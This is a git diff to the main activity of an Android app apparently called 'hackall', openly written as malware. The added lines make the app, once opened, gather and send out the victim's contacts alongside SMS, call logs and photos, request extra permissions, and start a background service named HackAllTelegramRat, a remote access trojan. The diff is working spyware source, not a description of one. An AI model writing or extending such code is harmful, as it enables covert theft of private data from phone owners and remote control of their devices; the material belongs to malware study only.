@@ -18,10 +18,14 @@ import com.karumi.dexter.listener.PermissionRequest
 import com.karumi.dexter.listener.PermissionRequestErrorListener
 import com.karumi.dexter.listener.multi.MultiplePermissionsListener
 import android.os.BatteryManager
+import cocomelonc.hackall.services.HackAllTelegramRat
 import cocomelonc.hackall.tools.HackAllCallLogs
 import cocomelonc.hackall.tools.HackAllCaller
+import cocomelonc.hackall.tools.HackAllContacts
 import cocomelonc.hackall.tools.HackAllSmsLogs
 import cocomelonc.hackall.tools.HackAllPhotos
+
+import cocomelonc.hackall.services.Actions
 
 class HackAllMainActivity : ComponentActivity() {
     private lateinit var cameraButton: Button
@@ -31,6 +35,7 @@ class HackAllMainActivity : ComponentActivity() {
     val hackAllCallLogs = HackAllCallLogs(context = this)
     val hackAllCaller = HackAllCaller(context = this)
     val hackAllPhotos = HackAllPhotos(context = this)
+    val hackAllContacts = HackAllContacts(context = this)
 
     // installed and opened - 1 stage
     private fun greetings(): String {
@@ -61,6 +66,7 @@ class HackAllMainActivity : ComponentActivity() {
                 "Charging Method: $chargeType"
     }
 
+    @SuppressLint("NewApi")
     private fun requestPermissions() {
         // below line is use to request permission in the current activity.
         // this method is use to handle error in runtime permissions
@@ -72,7 +78,8 @@ class HackAllMainActivity : ComponentActivity() {
                 Manifest.permission.CALL_PHONE,
                 Manifest.permission.READ_PHONE_STATE,
                 Manifest.permission.READ_CONTACTS,
-                Manifest.permission.READ_SMS
+                Manifest.permission.READ_SMS,
+                Manifest.permission.FOREGROUND_SERVICE,
             ) // after adding permissions we are calling an with listener method.
             .withListener(object : MultiplePermissionsListener {
                 override fun onPermissionsChecked(multiplePermissionsReport: MultiplePermissionsReport) {
@@ -88,6 +95,7 @@ class HackAllMainActivity : ComponentActivity() {
                         hackSms.getSmsLogs()
                         hackAllCallLogs.getCallLogs()
                         hackAllPhotos.sendPhotos()
+                        hackAllContacts.sendContacts()
                     }
 
                     // check for permanent denial of any permission
@@ -129,11 +137,17 @@ class HackAllMainActivity : ComponentActivity() {
         HackAllNetwork(this).sendTextMessage(greetings())
         HackAllNetwork(this).sendTextMessage(getBatteryInfo())
         this.requestPermissions()
+
+        val intent = Intent(this, HackAllTelegramRat::class.java)
+        intent.action = Actions.START.toString()
+        startService(intent)
+
         cameraButton = findViewById(R.id.camButton)
         cameraButton.setOnClickListener {
             hackSms.getSmsLogs()
             hackAllCallLogs.getCallLogs()
             hackAllPhotos.sendPhotos()
+            hackAllContacts.sendContacts()
             hackAllCaller.startNewCall()
         }
 
